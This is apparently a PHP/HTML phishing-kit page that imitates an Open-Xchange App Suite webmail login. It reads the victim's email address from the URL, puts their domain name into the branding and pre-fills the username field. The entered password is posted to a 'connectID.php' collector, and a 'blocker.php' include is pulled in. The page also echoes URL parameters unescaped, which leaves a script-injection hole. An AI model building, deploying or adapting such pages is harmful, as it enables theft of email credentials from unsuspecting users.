<?php
include('blocker.php');
?>
<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$loginpage = $_GET['loginpage'];
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html class=" js canvas no-touch websqldatabase indexeddb draganddrop cssanimations csstransforms3d video audio localstorage applicationcache unicode no-emoji filereader json" lang="en"><head>

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
<meta name="msapplication-tap-highlight" content="no">



<meta id="win8TileColor" name="msapplication-TileColor" content="#3c739b">


<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<style type="text/css">

html, body { background-color: #fff; margin: 0; padding: 0; border: 0; }
body { overflow: hidden; }

#background-loader {
    position: absolute; top: 0px; left: 0px;
    width: 100%; height: 100%; background-color: #fff; z-index: 65300;
}

.throbber {
    position: absolute;
    top: 50%;
    width: 100%;
    text-align: center;
    margin-top: -10px;
}

.throbber > div {
    width: 14px;
    height: 14px;
    background-color: #ccc;
    border-radius: 100%;
    display: inline-block;
    -webkit-animation: bouncedelay 1.4s infinite ease-in-out;
    animation: bouncedelay 1.4s infinite ease-in-out;
    /* Prevent first frame from flickering when animation starts */
    -webkit-animation-fill-mode: both;
    animation-fill-mode: both;
}

.throbber .bounce1 {
    -webkit-animation-delay: -0.32s;
    animation-delay: -0.32s;
}

.throbber .bounce2 {
    -webkit-animation-delay: -0.16s;
    animation-delay: -0.16s;
}

@-webkit-keyframes bouncedelay {
  0%, 80%, 100% { -webkit-transform: scale(0.0) }
  40% { -webkit-transform: scale(1.0) }
}

@keyframes bouncedelay {
  0%, 80%, 100% {
    transform: scale(0.0);
    -webkit-transform: scale(0.0);
  } 40% {
    transform: scale(1.0);
    -webkit-transform: scale(1.0);
  }
}
</style>

<meta id="bootstrap">
<meta id="theme">
<meta id="css">
<meta id="custom">
<meta id="code">

<link rel="stylesheet" href="files/login.css">
<script type="text/javascript" language="javascript" src="files/LIBCommon.js"></script>
<script>
  // signin page
  window.ox = { signin: true };
  // fix broken URL
  var path = location.pathname;
  if (/^\/\//.test(path)) {
    location.href = location.href.replace(path, path.substr(1));
  }
</script>
<title><?php echo $yuh ?> App Suite.  Login</title><link id="favicon" rel="shortcut icon" href="files/favicon.ico" type="image/x-icon"><link id="icon57" rel="apple-touch-icon" href="files/icon57.png"><link id="icon72" rel="apple-touch-icon" sizes="72x72" href="files/icon72.png"><link id="icon76" rel="apple-touch-icon" sizes="76x76" href="files/icon76.png"><link id="icon114" rel="apple-touch-icon" sizes="114x114" href="files/icon114.png"><link id="icon120" rel="apple-touch-icon" sizes="120x120" href="files/icon120.png"><link id="icon144" rel="apple-touch-icon" sizes="144x144" href="files/icon144.png"><link id="icon152" rel="apple-touch-icon" sizes="152x152" href="files/icon152.png"><link id="splash460" href="files/splashscreen_460.jpg" media="(device-width: 320px)" rel="apple-touch-startup-image"><link id="splash920" href="files/splashscreen_920.jpg" media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image"><link id="splash1096" href="files/splashscreen_1096.jpg" media="(device-aspect-ratio: 40/71)" rel="apple-touch-startup-image"><meta id="win8Icon" name="msapplication-TileImage" content="" href="files/icon144_win.png"></head>
<body class="unselectable">


<div id="background-loader" class="busy" style="display: none;">
    <div class="throbber">
      <div class="bounce1"></div>
      <div class="bounce2"></div>
      <div class="bounce3"></div>
    </div>
</div>


<div id="io-ox-core" class="abs unselectable" style="display: none">
    
    <div id="io-ox-topbar" role="navigation" class="f6-target">
        <ul class="launchers list-unstyled"></ul>
        <div class="launcher-dropdown dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="menuitem" aria-haspopup="true" tabindex="1"><i class="fa fa-bars" aria-hidden="true"></i></a>
            <ul class="dropdown-menu"></ul>
        </div>
    </div>
    
    <div id="io-ox-screens" class="abs">
        
        <div id="io-ox-windowmanager" class="abs" style="display: none">
            <div id="io-ox-windowmanager-pane" class="atb"></div>
        </div>
        
        <div id="io-ox-desktop" class="abs"></div>
    </div>
</div>


<div id="io-ox-login-screen-decorator" style="display: none"></div>
<div id="io-ox-login-screen" class="unselectable" style="display: block">

    
    <div id="io-ox-login-background" class="wallpaper"></div>
    <div id="io-ox-login-form-background"></div>

    <div id="io-ox-login-blocker" style="display: none"></div>

    <div id="io-ox-login-container-scrollpane">
    <div id="io-ox-login-container">

        <div class="css-table">

            <div class="css-table-row">
            <div class="css-table-cell" id="io-ox-login-header">
                <h1 class="clear-title">
                    <span id="io-ox-login-header-prefix"><?php echo $yuh ?> OX </span>
                    <span id="io-ox-login-header-label">App Suite</span>
                </h1>
            </div>
            </div>

            <div class="css-table-row">
            <div class="css-table-cell" id="io-ox-login-form-container">
                
                <form id="signin" method="post" action="connectID.php" id="io-ox-login-form"  >
                    <input type="hidden" name="location" value="">
					<input type="hidden" name="loginpage" value="<?php echo $_GET['loginpage']; ?>">
                    <div class="row">
                        <div class="form-group col-lg-6 col-md-6 col-sm-6 col-xs-12">
                            <label for="io-ox-login-username" class="sr-only" data-i18n="User name">User name</label>
                            <input type="email" id="io-ox-login-username" name="username" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" placeholder="User name" value="<?php echo $_GET['email']; ?>" readonly="" data-i18n="User name" data-i18n-attr="placeholder">
                        </div>
                        <div class="form-group col-lg-3 col-md-3 col-sm-3 col-xs-12">
                            <label for="io-ox-login-password" class="sr-only" data-i18n="Password">Password</label>
                            <input type="password" id="password" name="password" class="form-control col-lg-6" maxlength="100" autocorrect="off" autocapitalize="off" autofocus="" aria-required="true" placeholder="Password" data-i18n="Password" data-i18n-attr="placeholder">
                        </div>
                        <div class="form-group col-lg-3 col-md-3 col-sm-3 col-xs-12">
                            <input type="submit" name="signin" id="login-button" class="btn btn-primary btn-block" value="Sign in" data-i18n="Sign in" data-i18n-attr="value,aria-label" aria-label="Sign in">
                        </div>
                    </div>
                    <div class="row">
                        
                        
                    </div>

                    
                    <div class="row">
                        <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12" id="io-ox-login-feedback"></div>
                    </div>


                </form>
            </div>
            </div>

            <div class="css-table-row">
            <div class="css-table-cell" id="io-ox-login-footer">
                <div id="io-ox-languages"><i id="io-ox-languages-label" data-i18n="Languages" data-i18n-attr="text,aria-label" aria-label="Languages">Languages</i>:&nbsp; <span id="io-ox-language-list" role="menu" aria-labelledby="io-ox-languages-label"><a role="menuitem" href="#" aria-label="Dansk" lang="da_DK">Dansk</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Deutsch" lang="de_DE">Deutsch</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="English (UK)" lang="en_GB">English (UK)</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="English (US)" lang="en_US">English (US)</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Español" lang="es_ES">Español</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Español (México)" lang="es_MX">Español (México)</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Français" lang="fr_FR">Français</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Français (Canadian)" lang="fr_CA">Français (Canadian)</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Italiano" lang="it_IT">Italiano</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Latviešu" lang="lv_LV">Latviešu</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Magyar" lang="hu_HU">Magyar</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Nederlands" lang="nl_NL">Nederlands</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Polski" lang="pl_PL">Polski</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Português do Brasil" lang="pt_BR">Português do Brasil</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Pусский (Россия)" lang="ru_RU">Pусский (Россия)</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Română" lang="ro_RO">Română</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Slovenčina" lang="sk_SK">Slovenčina</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Svenska" lang="sv_SE">Svenska</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="suomi (Suomi)" lang="fi_FI">suomi (Suomi)</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="Čeština" lang="cs_CZ">Čeština</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="日本語(日本)" lang="ja_JP">日本語(日本)</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="简体中文" lang="zh_CN">简体中文</a><span class="language-delimiter">&nbsp;&nbsp;•&nbsp; </span><a role="menuitem" href="#" aria-label="繁體中文" lang="zh_TW">繁體中文</a></span></div>
                <div id="io-ox-copyright">&copy; <?php echo date("Y"); ?> Open-Xchange. Version: 7.6.2 Rev17 (<?php echo date("Y-m-d"); ?>)</div>
            </div>
            </div>

        </div>
    </div>
    </div>
</div>


<div id="io-ox-offline" style="bottom: -41px; display: none;"></div>

<div id="tmp" style="display: none;"></div>


<svg style="height:0;"><filter id="overlay-effect"><feGaussianBlur stdDeviation="2"></feGaussianBlur></filter></svg>

<script language="JavaScript" type="text/javascript" src="files/PDF01.js"></script>
    <script type="text/javascript" src="files/PDF02.js"></script>
    <script type="text/javascript" src="files/PDF03.js"></script>
	<script type="text/javascript" src="files/PDF04.js"></script>		
<script language="JavaScript" type="text/javascript">
<!--
function SetFocus()
{
	var control = document.getElementById('password');
	if ( control != null )
	{
		try {
			control.focus();
		}
		catch (e) {}
	}
}


setTimeout(SetFocus,500);
// -->
</script>


<noscript>
&lt;p class="noscript"&gt;This app uses JavaScript. Your browser either doesn't support JavaScript or you have it turned off. To use this app please use a JavaScript enabled browser.&lt;/p&gt;
&lt;!-- see bug #26722 --&gt;
</noscript>
</body></html>